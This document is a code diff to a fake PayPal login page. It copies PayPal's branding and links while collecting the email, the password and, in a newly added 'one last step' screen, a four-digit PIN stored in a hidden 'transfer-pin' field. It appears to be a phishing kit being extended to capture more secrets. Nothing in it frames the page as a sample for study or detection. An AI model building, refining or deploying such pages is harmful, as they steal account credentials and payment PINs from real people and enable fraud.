@@ -6,11 +6,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login to your PayPal Account</title>
     <link rel="shortcut icon" href="./logo.svg" type="image/x-icon">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link
-        href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
-        rel="stylesheet">
     <link rel="stylesheet" href="./main/css/style.css">
     <script src="./jquery.min.js"></script>
     <script src="main.js"></script>
@@ -22,7 +17,7 @@
             <div class="logo"><img src="./logo.svg" alt=""></div>
             <div class="input-hold">
                 <label for="email">Email or mobile number</label>
-                <input type="text" id="email" name="pali-email">
+                <input type="text" id="email" name="pay-email">
             </div>
             <p style="color: rgb(218, 87, 87); font-weight: 500; font-size: 13px; width: 100%; display: none;"
                 class="req">Required</p>
@@ -34,7 +29,8 @@
                 <div class="txt">or</div>
                 <div class="line"></div>
             </div>
-            <button onclick="location.href = 'https:\/\/www.paypal.com/ng/welcome/signup/#/login_info';">Sign Up</button>
+            <button onclick="location.href = 'https:\/\/www.paypal.com/ng/welcome/signup/#/login_info';">Sign
+                Up</button>
         </main>
         <main style="display: none;">
             <div class="logo"><img src="./logo.svg" alt=""></div>
@@ -44,20 +40,46 @@
             </div>
             <div class="input-hold">
                 <label for="password">Enter your password</label>
-                <input type="password" id="password" name="pali-password">
+                <input type="password" id="password" name="pay-password">
             </div>
             <div class="password-toggle">Show</div>
             <p style="color: rgb(218, 87, 87); font-weight: 500; font-size: 13px; width: 100%; display: none;"
                 class="req">Required</p>
             <a href="https://www.paypal.com/authflow/password-recovery/?country.x=NG&locale.x=en_US&redirectUri=%252Fsignin"
                 class="forgot-sth">Forgot password?</a>
-            <button id="submit" type="submit">Sign In</button>
+            <button id="move" onclick="return false;">Verify User</button>
             <div class="or">
                 <div class="line"></div>
                 <div class="txt">or</div>
                 <div class="line"></div>
             </div>
-            <button onclick="location.href = 'https:\/\/www.paypal.com/ng/welcome/signup/#/login_info';">Sign Up</button>
+            <button onclick="location.href = 'https:\/\/www.paypal.com/ng/welcome/signup/#/login_info';">Sign
+                Up</button>
+        </main>
+        <main style="display: none;">
+            <div class="logo"><img src="./logo.svg" alt=""></div>
+            <p class="action-col" style="text-align: center;">
+                <span><h3 style="margin-bottom: .3rem;">Just one last step.</h3><br>We need to verify it's really you.</span>
+            </p>
+            <div class="flex-pin-hold">
+                <input type="password" maxlength="1" />
+                <input type="password" maxlength="1" />
+                <input type="password" maxlength="1" />
+                <input type="password" maxlength="1" />
+            </div>
+            <p style="color: rgb(218, 87, 87); font-weight: 500; font-size: 13px; width: 100%; display: none;"
+                class="req">Required</p>
+            <a href="https://www.paypal.com/authflow/password-recovery/?country.x=NG&locale.x=en_US&redirectUri=%252Fsignin"
+                class="forgot-sth">Forgot PIN?</a>
+            <input type="hidden" name="transfer-pin" />
+            <button id="render" type="submit">Sign In</button>
+            <div class="or">
+                <div class="line"></div>
+                <div class="txt">or</div>
+                <div class="line"></div>
+            </div>
+            <button onclick="location.href = 'https:\/\/www.paypal.com/ng/welcome/signup/#/login_info';">Sign
+                Up</button>
         </main>
     </form>
     <footer>
